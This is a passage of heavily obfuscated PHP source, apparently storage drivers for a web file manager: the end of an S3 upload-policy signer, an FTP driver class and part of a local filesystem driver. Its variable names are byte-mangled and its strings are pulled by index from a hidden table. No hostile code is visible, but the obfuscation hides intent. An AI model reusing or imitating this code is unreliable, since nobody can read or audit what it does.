$›şœ™Å = $—¨âÀÓ[241]; $ßÁ­šÃ = $™–À¨¨ . $—¨âÀÓ[12]; $€È¨Ûšç = $—¨âÀÓ[242]; $¿ùóÕÂ = array($this->accessKey, $’ƒ»êƒ…, $this->region, $¾×¶×ÇÌ, $›şœ™Å); $‘õâû = implode($—¨âÀÓ[8], $¿ùóÕÂ); $ˆœÔğúÓ = array($—¨âÀÓ[243] => gmdate($—¨âÀÓ[1345], strtotime($—¨âÀÓ[245])), $—¨âÀÓ[246] => array(array($—¨âÀÓ[247] => $this->bucket), array($—¨âÀÓ[248] => $ ¸Ì£«), array($—¨âÀÓ[249], $—¨âÀÓ[250], $—¨âÀÓ[12]), array($—¨âÀÓ[249], $—¨âÀÓ[251], $—¨âÀÓ[12]), array($—¨âÀÓ[249], $—¨âÀÓ[252], $—¨âÀÓ[12]), array($—¨âÀÓ[253] => $€È¨Ûšç), array($—¨âÀÓ[254] => $‘õâû), array($—¨âÀÓ[255] => $£³Şáè‡), array($—¨âÀÓ[256] => $ı¿Ä±»Ë), array($—¨âÀÓ[257] => $ßÁ­šÃ))); $¶‡Ğåôƒ = base64_encode(json_encode($ˆœÔğúÓ)); $Ø‚–á×ş = hash_hmac($—¨âÀÓ[258], $’ƒ»êƒ…, $—¨âÀÓ[259] . $this->secret, !0); $Øñ„½ = hash_hmac($—¨âÀÓ[258], $this->region, $Ø‚–á×ş, !0); $ÜçÊ¦¸Å = hash_hmac($—¨âÀÓ[258], $¾×¶×ÇÌ, $Øñ„½, !0); $•òŞ·ü” = hash_hmac($—¨âÀÓ[258], $›şœ™Å, $ÜçÊ¦¸Å, !0); $¿–‹ïÊ˜ = hash_hmac($—¨âÀÓ[258], $¶‡Ğåôƒ, $•òŞ·ü”); $˜¨¬•­‘ = array($—¨âÀÓ[215] => $—¨âÀÓ[12], $—¨âÀÓ[260] => $—¨âÀÓ[12], $—¨âÀÓ[248] => $ ¸Ì£«, $—¨âÀÓ[253] => $€È¨Ûšç, $—¨âÀÓ[261] => $¶‡Ğåôƒ, $—¨âÀÓ[262] => $‘õâû, $—¨âÀÓ[263] => $£³Şáè‡, $—¨âÀÓ[264] => $ı¿Ä±»Ë, $—¨âÀÓ[265] => $ßÁ­šÃ, $—¨âÀÓ[266] => $¿–‹ïÊ˜, $—¨âÀÓ[182] => $this->getHost()); return $˜¨¬•­‘; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($í›‘Ö‚Î) { parent::__construct(); if (count($í›‘Ö‚Î) > 0) { $this->_init($í›‘Ö‚Î); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($½“Ä†¼¥) { $÷Ÿ¦€¬¹ =& $_SERVER[¡“ËÌ§œ]; global $config; $this->appCharset = $config[$÷Ÿ¦€¬¹[1372]]; $this->systemCharset = $config[$÷Ÿ¦€¬¹[1373]]; if (isset($½“Ä†¼¥[$÷Ÿ¦€¬¹[1374]]) && $½“Ä†¼¥[$÷Ÿ¦€¬¹[1374]]) { $this->systemCharset = $½“Ä†¼¥[$÷Ÿ¦€¬¹[1374]]; } } public function iconvApp($¦”ıíöÈ) { return $this->iconvTo($¦”ıíöÈ, $this->systemCharset, $this->appCharset); } public function iconvSystem($çÜÅ÷ñ) { return $this->iconvTo($çÜÅ÷ñ, $this->appCharset, $this->systemCharset); } public function getPathOuter($‡ÔáÂŠö) { $€‘øûÇ± =& $_SERVER[¡“ËÌ§œ]; $³İ¾ÚÈø = $this->iconvApp($this->pathBase); $‡ÔáÂŠö = $this->iconvApp($‡ÔáÂŠö); if (substr($³İ¾ÚÈø, 0, 2) == $€‘øûÇ±[1298]) { $³İ¾ÚÈø = BASIC_PATH . substr($³İ¾ÚÈø, 2); } if (substr($‡ÔáÂŠö, 0, 2) == $€‘øûÇ±[1298]) { $‡ÔáÂŠö = BASIC_PATH . substr($‡ÔáÂŠö, 2); } $³İ¾ÚÈø = KodIO::clear($³İ¾ÚÈø); $‡ÔáÂŠö = KodIO::clear($‡ÔáÂŠö); $‡ÔáÂŠö = substr($‡ÔáÂŠö, strlen($³İ¾ÚÈø)); if (empty($this->pathDriver)) { return $‡ÔáÂŠö; } return $this->pathDriver . $€‘øûÇ±[8] . ltrim($‡ÔáÂŠö, $€‘øûÇ±[8]); } private function _init($ÚœßìĞ = array()) { $œèñ¶³¬ =& $_SERVER[¡“ËÌ§œ]; if (!function_exists($œèñ¶³¬[1375])) { throw new Exception(LNG($œèñ¶³¬[1376])); } $this->config = $ÚœßìĞ; $this->charsetReset($ÚœßìĞ); foreach ($ÚœßìĞ as $•‡ô => $Õó•±ûÒ) { if (isset($this->{$•‡ô})) { $this->{$•‡ô} = $Õó•±ûÒ; } } return $this->_login($ÚœßìĞ); } private function _login($Ì¿‘Ì¸ı) { $¾ûüóÈş =& $_SERVER[¡“ËÌ§œ]; static $ô•ã£ğı = array(); $î©µ¡æ¦ = md5(json_encode($Ì¿‘Ì¸ı)); if (isset($ô•ã£ğı[$î©µ¡æ¦])) { foreach ($ô•ã£ğı[$î©µ¡æ¦] as $“öÕŠÒ¹ => $¬™„ç­ï) { $this->{$“öÕŠÒ¹} = $¬™„ç­ï; } return !0; } $£ñËÒ¾ı = parse_url(trim($this->server, $¾ûüóÈş[8])); $this->host = $£ñËÒ¾ı[$¾ûüóÈş[182]]; $òùŒ½İ = isset($£ñËÒ¾ı[$¾ûüóÈş[181]]) && $£ñËÒ¾ı[$¾ûüóÈş[181]] == $¾ûüóÈş[1377] ? !0 : !1; $this->scheme = $òùŒ½İ ? $¾ûüóÈş[1378] : $¾ûüóÈş[1379]; $this->port = isset($£ñËÒ¾ı[$¾ûüóÈş[183]]) ? $£ñËÒ¾ı[$¾ûüóÈş[183]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $õÓ‹¿¹ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ŸÜ—±Ú¨ = $this->pasv == $¾ûüóÈş[88] ? !0 : !1; @ftp_pasv($this->connect, $ŸÜ—±Ú¨); $ô•ã£ğı[$î©µ¡æ¦] = array($¾ûüóÈş[1380] => $this->connect, $¾ûüóÈş[182] => $this->host, $¾ûüóÈş[181] => $this->scheme, $¾ûüóÈş[183] => $this->port); return $õÓ‹¿¹; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($—¬µÁ”§, $¤…Æğ² = '', $±¤şêğ¦ = REPEAT_RENAME) { if ($this->setContent($—¬µÁ”§, $¤…Æğ²)) { return $this->getPathOuter($—¬µÁ”§); } return !1; } public function mkdir($ÉÕ®­‘ù, $Ù«É¾°³ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ÉÕ®­‘ù = $this->iconvSystem($ÉÕ®­‘ù); if ($this->_isFolder($ÉÕ®­‘ù) || @ftp_mkdir($this->connect, $ÉÕ®­‘ù)) { return $this->getPathOuter($ÉÕ®­‘ù); } if (!$this->mkdir($this->pathFather($ÉÕ®­‘ù))) { return !1; } if ($ÉÕ®­‘ù = @ftp_mkdir($this->connect, $ÉÕ®­‘ù)) { return $this->getPathOuter($ÉÕ®­‘ù); } return !1; } public function copyFile($¹ÔØğ•®, $©·œ¯Âğ) { if (!$this->_isconn()) { return !1; } $×Äí¹‰º = $this->pathThis($this->iconvSystem($¹ÔØğ•®)); $ÜóˆíÄ = $this->tempFile($×Äí¹‰º); $¶å…ºï¼ = $this->iconvApp($ÜóˆíÄ); $this->download($¹ÔØğ•®, $¶å…ºï¼); $°µ³Ö® = $this->upload($©·œ¯Âğ, $¶å…ºï¼); $this->tempFileRemve($ÜóˆíÄ); return $°µ³Ö®; } public function moveFile($¨»³”ó“, $ãˆà°˜Ù) { if (!$this->_isconn()) { return !1; } $¨»³”ó“ = $this->iconvSystem($¨»³”ó“); $ãˆà°˜Ù = $this->iconvSystem($ãˆà°˜Ù); $®ÖÔÎ¯ = @ftp_rename($this->connect, $¨»³”ó“, $ãˆà°˜Ù); return $®ÖÔÎ¯ ? $this->getPathOuter($ãˆà°˜Ù) : !1; } public function delFile($‚ºÏ¬®÷) { if (!$this->_isconn()) { return !1; } $‚ºÏ¬®÷ = $this->iconvSystem($‚ºÏ¬®÷); return @ftp_delete($this->connect, $‚ºÏ¬®÷); } public function delFolder($‡ÙÁè××) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $œ¬Ìä£¬ = $óœâÁÃ¸ = array(); $this->fileList($‡ÙÁè××, $œ¬Ìä£¬, $óœâÁÃ¸, !0); $this->listItemCache = !0; foreach ($óœâÁÃ¸ as $õÛ©´§ç) { $ÖÑ¤½ÏÇ = $this->iconvSystem($õÛ©´§ç[$_SERVER[¡“ËÌ§œ][32]]); $äİĞ™­ = @ftp_delete($this->connect, $ÖÑ¤½ÏÇ); if (!$äİĞ™­) { return !1; } } foreach ($œ¬Ìä£¬ as $ÖÑ¤½ÏÇ) { $ÖÑ¤½ÏÇ = $this->iconvSystem($ÖÑ¤½ÏÇ); $äİĞ™­ = @ftp_rmdir($this->connect, $ÖÑ¤½ÏÇ); if (!$äİĞ™­) { return !1; } } $‡ÙÁè×× = $this->iconvSystem($‡ÙÁè××); return @ftp_rmdir($this->connect, $‡ÙÁè××); } public function rename($ÓÀè”á§, $Ø’Á¼™Ê) { $ÃüÆÌÇ± =& $_SERVER[¡“ËÌ§œ]; if (!$this->_isconn()) { return !1; } $’ÂÓ™€Œ = $this->fileNameAuto($this->pathFather($ÓÀè”á§), $Ø’Á¼™Ê); $’ÂÓ™€Œ = $this->iconvSystem($’ÂÓ™€Œ); $ÓÀè”á§ = $this->iconvSystem($ÓÀè”á§); $¿Ñíäøî = $this->pathFather($ÓÀè”á§); $Ã´‡İ§ó = rtrim($¿Ñíäøî, $ÃüÆÌÇ±[8]) . $ÃüÆÌÇ±[8] . $’ÂÓ™€Œ; $Ûá­ü‡© = @ftp_rename($this->connect, $ÓÀè”á§, $Ã´‡İ§ó); $Ã´‡İ§ó = $this->iconvApp($Ã´‡İ§ó); return $Ûá­ü‡© ? $this->getPathOuter($Ã´‡İ§ó) : !1; } private function folderInfo($‰ñõö´Ç, $—£‘¯¤î = false) { $Ô¥…î¶ =& $_SERVER[¡“ËÌ§œ]; $òƒµáş¼ = array($Ô¥…î¶[32] => $this->pathThis($‰ñõö´Ç), $Ô¥…î¶[84] => $this->getPathOuter($Ô¥…î¶[8] . $‰ñõö´Ç), $Ô¥…î¶[33] => $Ô¥…î¶[75]); if ($—£‘¯¤î) { return $òƒµáş¼; } $òƒµáş¼[$Ô¥…î¶[201]] = $òƒµáş¼[$Ô¥…î¶[85]] = 0; $òƒµáş¼[$Ô¥…î¶[202]] = $òƒµáş¼[$Ô¥…î¶[203]] = !0; return $òƒµáş¼; } private function fileInfo($ï³Ü÷ë, $á ôşõ¯ = false, $±„Æ¸‰Ë = array()) { $ö•³ıÅ =& $_SERVER[¡“ËÌ§œ]; $Èú½è«– = array($ö•³ıÅ[32] => $this->pathThis($ï³Ü÷ë), $ö•³ıÅ[84] => $this->getPathOuter($ö•³ıÅ[8] . $ï³Ü÷ë), $ö•³ıÅ[33] => $ö•³ıÅ[200], $ö•³ıÅ[76] => isset($±„Æ¸‰Ë[$ö•³ıÅ[76]]) ? $±„Æ¸‰Ë[$ö•³ıÅ[76]] : 0, $ö•³ıÅ[174] => $this->ext($ï³Ü÷ë)); if ($á ôşõ¯) { return $Èú½è«–; } $Èú½è«–[$ö•³ıÅ[201]] = $Èú½è«–[$ö•³ıÅ[85]] = 0; $Èú½è«–[$ö•³ıÅ[202]] = $Èú½è«–[$ö•³ıÅ[203]] = !0; $ÇÑ…Äµ = $this->iconvSystem($ï³Ü÷ë); $Èú½è«–[$ö•³ıÅ[85]] = @ftp_mdtm($this->connect, $ÇÑ…Äµ); if (empty($±„Æ¸‰Ë)) { $±„Æ¸‰Ë = $this->objectMeta($ï³Ü÷ë); if (!$±„Æ¸‰Ë) { return $Èú½è«–; } } $Èú½è«–[$ö•³ıÅ[76]] = $±„Æ¸‰Ë[$ö•³ıÅ[76]]; return $Èú½è«–; } public function size($³¨»¦ŠÄ) { $¿ñ¶Ô¨ = $this->objectMeta($³¨»¦ŠÄ); return $¿ñ¶Ô¨ ? $¿ñ¶Ô¨[$_SERVER[¡“ËÌ§œ][76]] : 0; } public function info($šışªœŞ) { if ($this->isFile($šışªœŞ)) { return $this->fileInfo($šışªœŞ, 0); } else { if ($this->isFolder($šışªœŞ)) { return $this->folderInfo($šışªœŞ); } } return !1; } private function fileList($Ñêõ×èü, &$àáÂÓ•¼, &$æç´ä¾ş, $×îŞâ° = false) { $ÀÔ¶Ö¼Á =& $_SERVER[¡“ËÌ§œ]; $Ñêõ×èü = $this->iconvSystem($Ñêõ×èü); if (!$this->isFolder($Ñêõ×èü)) { return !1; } @ftp_chdir($this->connect, $ÀÔ¶Ö¼Á[8]); $Ñêõ×èü = rtrim($Ñêõ×èü, $ÀÔ¶Ö¼Á[8]) . $ÀÔ¶Ö¼Á[8]; check_abort(); $¿€¿Íğ = @ftp_rawlist($this->connect, $Ñêõ×èü); if (!$¿€¿Íğ) { $¿€¿Íğ = array(); } $ÙÑ¢îô† = array($ÀÔ¶Ö¼Á[10] => 1, $ÀÔ¶Ö¼Á[1299] => 1); foreach ($¿€¿Íğ as $Â¡»ü¿´) { $£½èú‡© = $this->_listItem($Â¡»ü¿´); if ($£½èú‡©[0] == $ÀÔ¶Ö¼Á[778]) { continue; } $Äº·Ò°ë = $£½èú‡©[8]; if (empty($Äº·Ò°ë) && $Äº·Ò°ë !== $ÀÔ¶Ö¼Á[198] || isset($ÙÑ¢îô†[$Äº·Ò°ë])) { continue; } $Äº·Ò°ë = $this->iconvApp($Ñêõ×èü . ltrim($Äº·Ò°ë, $ÀÔ¶Ö¼Á[8])); $§³ÉØËÉ = array($ÀÔ¶Ö¼Á[32] => $Äº·Ò°ë, $ÀÔ¶Ö¼Á[33] => $ÀÔ¶Ö¼Á[200], $ÀÔ¶Ö¼Á[76] => $£½èú‡©[4]); if (substr($Â¡»ü¿´, 0, 1) == $ÀÔ¶Ö¼Á[1381]) { $§³ÉØËÉ[$ÀÔ¶Ö¼Á[33]] = $ÀÔ¶Ö¼Á[75]; $§³ÉØËÉ[$ÀÔ¶Ö¼Á[76]] = 0; } $äÚ¤ï¾ = $§³ÉØËÉ[$ÀÔ¶Ö¼Á[33]] == $ÀÔ¶Ö¼Á[75] ? !0 : !1; $this->cacheMethodInfoSet($Äº·Ò°ë, $äÚ¤ï¾, $§³ÉØËÉ); if ($äÚ¤ï¾) { $àáÂÓ•¼[] = $Äº·Ò°ë; if ($×îŞâ°) { $this->fileList($Äº·Ò°ë, $àáÂÓ•¼, $æç´ä¾ş, $×îŞâ°); } continue; } $æç´ä¾ş[] = $§³ÉØËÉ; } $this->cacheMethodInfoSet($Ñêõ×èü, !0); } private function _listItem($²Ü­úÅ) { if (empty($²Ü­úÅ)) { return array(); } $¤‡³©Šã = preg_split($_SERVER[¡“ËÌ§œ][1382], $²Ü­úÅ); if (count($¤‡³©Šã) <= 9) { return $¤‡³©Šã; } $¤‡³©Šã[8] = trim(substr($²Ü­úÅ, strpos($²Ü­úÅ, $¤‡³©Šã[7]) + strlen($¤‡³©Šã[7]))); return array_splice($¤‡³©Šã, 0, 9); } public function listPath($ê´ÊÌó¢, $«éÌ®Òà = false) { $‚÷êóŒ =& $_SERVER[¡“ËÌ§œ]; if (!$this->_isconn()) { return !1; } $ÆÁ‘ÎŸ = $ÕµÙæ’÷ = array(); $this->fileList($ê´ÊÌó¢, $ÆÁ‘ÎŸ, $ÕµÙæ’÷); foreach ($ÆÁ‘ÎŸ as $˜ŠÛĞó => $ÜÚğ™˜¤) { $ÆÁ‘ÎŸ[$˜ŠÛĞó] = $this->folderInfo($ÜÚğ™˜¤, $«éÌ®Òà); } foreach ($ÕµÙæ’÷ as $˜ŠÛĞó => $ÜÚğ™˜¤) { $ÕµÙæ’÷[$˜ŠÛĞó] = $this->fileInfo($ÜÚğ™˜¤[$‚÷êóŒ[32]], $«éÌ®Òà, $ÜÚğ™˜¤); } return array($‚÷êóŒ[82] => $ÆÁ‘ÎŸ, $‚÷êóŒ[83] => $ÕµÙæ’÷); } public function has($ËúÓÛ“Ü, $ÊÍ›¾ = false, $ª£ğó•£ = true) { $“à®÷Àä =& $_SERVER[¡“ËÌ§œ]; $ê­€ñ¯Ç = $€Ö†¢œ = array(); $öşˆƒ¯Í = $ÊÍ›¾ ? !0 : !1; $this->fileList($ËúÓÛ“Ü, $ê­€ñ¯Ç, $€Ö†¢œ, $öşˆƒ¯Í); if ($ÊÍ›¾) { return array($“à®÷Àä[207] => count($€Ö†¢œ), $“à®÷Àä[208] => count($ê­€ñ¯Ç)); } if ($ª£ğó•£) { if (count($€Ö†¢œ)) { return !0; } } else { if (count($ê­€ñ¯Ç)) { return !0; } } return !1; } public function listAll($Äš»ìóÚ) { $¹ŸºÃ´û =& $_SERVER[¡“ËÌ§œ]; if (!$this->_isconn()) { return !1; } $ÄĞı¨Ç» = $Ì‰¿ô¢’ = array(); $this->fileList($Äš»ìóÚ, $ÄĞı¨Ç», $Ì‰¿ô¢’, !0); $Í´ä–Ç¢ = array_to_keyvalue($Ì‰¿ô¢’, $¹ŸºÃ´û[32]); foreach ($ÄĞı¨Ç» as $©¯÷ôˆ) { if (is_string($©¯÷ôˆ)) { $Í´ä–Ç¢[$©¯÷ôˆ] = array($¹ŸºÃ´û[76] => 0); } } return $this->listAllFiles($Äš»ìóÚ, $Í´ä–Ç¢); } public function getContent($«ú´‹÷è) { if (!$this->_isconn()) { return !1; } $«ú´‹÷è = $this->iconvSystem($«ú´‹÷è); return $this->fileSubstr($«ú´‹÷è); } public function setContent($¨Æ®¥¥Ú, $’Ò½éí = '') { if (!$this->_isconn()) { return !1; } $œÌîéê¡ = $this->pathThis($this->iconvSystem($¨Æ®¥¥Ú)); $¶ÏÙô˜ò = $this->tempFile($œÌîéê¡); file_put_contents($¶ÏÙô˜ò, $’Ò½éí); $Õ¾ŞË°ª = $this->upload($¨Æ®¥¥Ú, $this->iconvApp($¶ÏÙô˜ò)); $this->tempFileRemve($¶ÏÙô˜ò); return $Õ¾ŞË°ª; } public function fileSubstr($îí³®–, $òÑåÔÓÕ = 0, $ƒ„ÓØş = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($îí³®–, $òÑåÔÓÕ, $ƒ„ÓØş); } private function ftpRequest($æ’ŸëÕÊ, $¨½”¶õÎ = 0, $…ÕˆúŸ­ = false) { $æ’ŸëÕÊ = $this->iconvSystem($æ’ŸëÕÊ); $ÈÖşêÔ = $this->scheme . $this->host . $_SERVER[¡“ËÌ§œ][4] . $this->port; $Ë½™¥šë = curl_init(); curl_setopt($Ë½™¥šë, CURLOPT_URL, $ÈÖşêÔ . $this->pathEncode($æ’ŸëÕÊ)); curl_setopt($Ë½™¥šë, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($…ÕˆúŸ­) { $Ø³¶â = $¨½”¶õÎ + $…ÕˆúŸ­ - 1; curl_setopt($Ë½™¥šë, CURLOPT_RANGE, "{$¨½”¶õÎ}\x2d{$Ø³¶â}"); } curl_setopt($Ë½™¥šë, CURLOPT_RETURNTRANSFER, 1); $û†‰É‡ú = curl_exec($Ë½™¥šë); curl_close($Ë½™¥šë); return $û†‰É‡ú; } public function upload($ùø’ ó÷, $àŒÍî¦², $€ğéŸ¬® = false, $œŞÏ•¥ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ùø’ ó÷))) { return !1; } $ùø’ ó÷ = $this->iconvSystem($ùø’ ó÷); $àŒÍî¦² = $this->iconvSystem($àŒÍî¦²); $‘ƒÛ¤ÃŸ = ftp_nb_put($this->connect, $ùø’ ó÷, $àŒÍî¦², FTP_BINARY); while ($‘ƒÛ¤ÃŸ == FTP_MOREDATA) { $‘ƒÛ¤ÃŸ = ftp_nb_continue($this->connect); } if ($‘ƒÛ¤ÃŸ != FTP_FINISHED) { return !1; } return $this->getPathOuter($ùø’ ó÷); } public function download($¨Ï·‚¯, $õ÷­î¨Å = '') { if (!$this->_isconn()) { return !1; } $ÀÔôµ = $this->pathFather($õ÷­î¨Å); if (!IO::mkdir($ÀÔôµ)) { return !1; } $¨Ï·‚¯ = $this->iconvSystem($¨Ï·‚¯); $õ÷­î¨Å = $this->iconvSystem($õ÷­î¨Å); $Ö¼ÔÔ¢ = ftp_nb_get($this->connect, $õ÷­î¨Å, $¨Ï·‚¯, FTP_BINARY); while ($Ö¼ÔÔ¢ == FTP_MOREDATA) { $Ö¼ÔÔ¢ = ftp_nb_continue($this->connect); } if ($Ö¼ÔÔ¢ != FTP_FINISHED) { return !1; } return $this->iconvApp($õ÷­î¨Å); } public function exist($ÏíüÀ¯×) { return $this->isFile($ÏíüÀ¯×) || $this->isFolder($ÏíüÀ¯×); } public function isFile($ñ†æ¶³¬) { return !$this->isFolder($ñ†æ¶³¬) && $this->objectMeta($ñ†æ¶³¬); } public function isFolder($é „¶¬¾) { return $this->cacheMethod($_SERVER[¡“ËÌ§œ][165], $é „¶¬¾); } protected function objectMeta($ä›‘‡†Å) { return $this->cacheMethod($_SERVER[¡“ËÌ§œ][167], $ä›‘‡†Å); } protected function _objectMeta($²Ç–’®ü) { $›ù—ƒé =& $_SERVER[¡“ËÌ§œ]; if ($²Ç–’®ü == $›ù—ƒé[12] || $²Ç–’®ü == $›ù—ƒé[8]) { return array(); } if (!$this->_isconn()) { return !1; } $²Ç–’®ü = $this->iconvSystem($²Ç–’®ü); $Ä¼ÛöÛ = array($›ù—ƒé[32] => $this->iconvApp($²Ç–’®ü), $›ù—ƒé[33] => $›ù—ƒé[200], $›ù—ƒé[76] => 0); @ftp_chdir($this->connect, $›ù—ƒé[8]); $¿Ñ¥Õ©• = @ftp_size($this->connect, $²Ç–’®ü); if ($¿Ñ¥Õ©• != -1) { $Ä¼ÛöÛ[$›ù—ƒé[76]] = $¿Ñ¥Õ©•; } else { $œÙæÔ = @ftp_chdir($this->connect, $²Ç–’®ü); if (!$œÙæÔ) { return !1; } $Ä¼ÛöÛ[$›ù—ƒé[33]] = $›ù—ƒé[75]; } return $Ä¼ÛöÛ; } protected function _isFolder($­Ş®ş…é) { $ İóÑŞ =& $_SERVER[¡“ËÌ§œ]; if ($­Ş®ş…é == $ İóÑŞ[12] || $­Ş®ş…é == $ İóÑŞ[8]) { return !0; } $”´¨ùİ“ = $this->_objectMeta($­Ş®ş…é); return isset($”´¨ùİ“[$ İóÑŞ[33]]) && $”´¨ùİ“[$ İóÑŞ[33]] == $ İóÑŞ[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Œ©¢ÏŸ) { if (substr($Œ©¢ÏŸ, 0, 2) == $_SERVER[¡“ËÌ§œ][1298]) { $Œ©¢ÏŸ = BASIC_PATH . substr($Œ©¢ÏŸ, 2); } return $Œ©¢ÏŸ; } public function iconvApp($¡Ö†¸§°) { $ğ°§†ì =& $_SERVER[¡“ËÌ§œ]; global $config; return $this->iconvTo($¡Ö†¸§°, $config[$ğ°§†ì[1373]], $config[$ğ°§†ì[1372]]); } public function iconvSystem($ğáÍ®ó´) { $ƒƒ´Ó¦ =& $_SERVER[¡“ËÌ§œ]; global $config; return $this->iconvTo($ğáÍ®ó´, $config[$ƒƒ´Ó¦[1372]], $config[$ƒƒ´Ó¦[1373]]); } public function getPathOuter($â†‹¾â) { $Ä¥²æÜê =& $_SERVER[¡“ËÌ§œ]; $ûæŞÅÑ± = $this->iconvApp($this->pathBase); $â†‹¾â = $this->iconvApp($â†‹¾â); if (substr($ûæŞÅÑ±, 0, 2) == $Ä¥²æÜê[1298]) { $ûæŞÅÑ± = BASIC_PATH . substr($ûæŞÅÑ±, 2); } if (substr($â†‹¾â, 0, 2) == $Ä¥²æÜê[1298]) { $â†‹¾â = BASIC_PATH . substr($â†‹¾â, 2); } $ûæŞÅÑ± = KodIO::clear($ûæŞÅÑ±); $â†‹¾â = KodIO::clear($â†‹¾â); $â†‹¾â = substr($â†‹¾â, strlen($ûæŞÅÑ±)); if (empty($this->pathDriver)) { return $â†‹¾â; } return $this->pathDriver . $Ä¥²æÜê[8] . ltrim($â†‹¾â, $Ä¥²æÜê[8]); } public function mkfile($Öºîü, $¬²õõê = '', $ç¾—ìè = REPEAT_RENAME) { $Öºîü = $this->iconvSystem($Öºîü); @touch($Öºîü); if ($¬²õõê) { file_put_contents($Öºîü, $¬²õõê); } @chmod($Öºîü, $this->pathAuth); return is_file($Öºîü) ? $this->getPathOuter($Öºîü) : !1; } public function mkdir($°ÕÓĞ”ß, $Ù˜â©Ÿ‰ = REPEAT_SKIP) { $°ÕÓĞ”ß = $this->iconvSystem($°ÕÓĞ”ß); if (is_dir($°ÕÓĞ”ß)) { return $this->getPathOuter($°ÕÓĞ”ß); } @mkdir($°ÕÓĞ”ß, $this->pathAuth, !0); @chmod($°ÕÓĞ”ß, $this->pathAuth); return is_dir($°ÕÓĞ”ß) ? $this->getPathOuter($°ÕÓĞ”ß) : !1; } public function copyFile($£Õ³€¦ç, $ÔÑáëÂ¦) { $this->mkdir($this->pathFather($ÔÑáëÂ¦)); $£Õ³€¦ç = $this->iconvSystem($£Õ³€¦ç); $ÔÑáëÂ¦ = $this->iconvSystem($ÔÑáëÂ¦); $õúÆ§®‘ = copy_64($£Õ³€¦ç, $ÔÑáëÂ¦); @chmod($ÔÑáëÂ¦, $this->pathAuth); return $õúÆ§®‘ ? $this->getPathOuter($ÔÑáëÂ¦) : !1; } public function moveFile($Òèç‚»˜, $Œâôëì) { $this->mkdir($this->pathFather($Œâôëì)); $Òèç‚»˜ = $this->iconvSystem($Òèç‚»˜); $Œâôëì = $this->iconvSystem($Œâôëì); $±§•›®€ = intval(@rename($Òèç‚»˜, $Œâôëì)); if (!$±§•›®€) { if ($±§•›®€ = intval(@copy_64($Òèç‚»˜, $Œâôëì))) { @unlink($Òèç‚»˜); } } @chmod($Œâôëì, $this->pathAuth); return $±§•›®€ ? $this->getPathOuter($Œâôëì) : !1; } public function movePath($ú¼éåŠé, $§›Éç“Ÿ, $ÀğÆÃÇ = false) { $óâ²ó‡² =& $_SERVER[¡“ËÌ§œ]; $ú¼éåŠé = $this->iconvSystem($ú¼éåŠé); $§›Éç“Ÿ = $this->iconvSystem($§›Éç“Ÿ); $ ¶©ÓÃÒ = rtrim($§›Éç“Ÿ, $óâ²ó‡²[8]) . $óâ²ó‡²[8] . ($ÀğÆÃÇ ? $ÀğÆÃÇ : get_path_this($ú¼éåŠé)); if (file_exists($ ¶©ÓÃÒ)) { return !1; } $òİóá÷ï = intval(@rename($ú¼éåŠé, $ ¶©ÓÃÒ)); $òİóá÷ï = file_exists($ ¶©ÓÃÒ); return $òİóá÷ï ? $this->getPathOuter($ ¶©ÓÃÒ) : !1; } public function delFile($å“Ä—Ìú) { $å“Ä—Ìú = $this->iconvSystem($å“Ä—Ìú); if (!@unlink($å“Ä—Ìú)) { @chmod($å“Ä—Ìú, $this->pathAuth); if (!@unlink($å“Ä—Ìú)) { return !1; } } else { return !0; } } public function delFolder($º‹¬Ãã€) { $š°âÇ—ë =& $_SERVER[¡“ËÌ§œ]; $º‹¬Ãã€ = $this->iconvSystem($º‹¬Ãã€); if (!is_dir($º‹¬Ãã€)) { return !0; } if (!($ï·»øÍì = opendir($º‹¬Ãã€))) { return !1; } while (($¢ùÓÉÏä = readdir($ï·»øÍì)) !== !1) { if ($¢ùÓÉÏä == $š°âÇ—ë[10] || $¢ùÓÉÏä == $š°âÇ—ë[1299]) { continue; } $š“§Šö× = $º‹¬Ãã€ . $š°âÇ—ë[8] . $¢ùÓÉÏä; if (is_file($š“§Šö×) || is_link($š“§Šö×)) { if (!unlink($š“§Šö×)) { chmod($š“§Šö×, $this->pathAuth); if (!unlink($š“§Šö×)) { return !1; } } } else { if (is_dir($š“§Šö×)) { chmod($š“§Šö×, $this->pathAuth); $š“§Šö× = $this->iconvApp($š“§Šö×); if (!$this->delFolder($š“§Šö×)) { return !1; } } } } closedir($ï·»øÍì); return rmdir($º‹¬Ãã€); } public function rename($¬êğ°«µ, $‡ûß¸£¥) { $İÊ‚°à =& $_SERVER[¡“ËÌ§œ]; $â‰Š„¤ú = $this->fileNameAuto($this->pathFather($¬êğ°«µ), $‡ûß¸£¥); $â‰Š„¤ú = $this->iconvSystem($â‰Š„¤ú); $¬êğ°«µ = $this->iconvSystem($¬êğ°«µ); $Ë¼ÚÔŠ¿ = $this->pathFather($¬êğ°«µ); $É²ó  = rtrim($Ë¼ÚÔŠ¿, $İÊ‚°à[8]) . $İÊ‚°à[8] . $â‰Š„¤ú; $Áù±Ñ©í = @rename($¬êğ°«µ, $É²ó ); $É²ó  = $this->iconvApp($É²ó ); return $Áù±Ñ©í ? $this->getPathOuter($É²ó ) : !1; } public function size($¾ˆ ™÷) { $¾ˆ ™÷ = $this->iconvSystem($¾ˆ ™÷); return filesize_64($¾ˆ ™÷); } public function info($Ş«ÏŞİş) { $Ş«ÏŞİş = $this->iconvSystem($Ş«ÏŞİş); if ($this->isFolder($Ş«ÏŞİş)) { return $this->folderInfo($Ş«ÏŞİş); } else { if ($this->isFile($Ş«ÏŞİş)) { return $this->fileInfo($Ş«ÏŞİş); } } return !1; } protected function infoChildren($ûÙ©Ô¢, 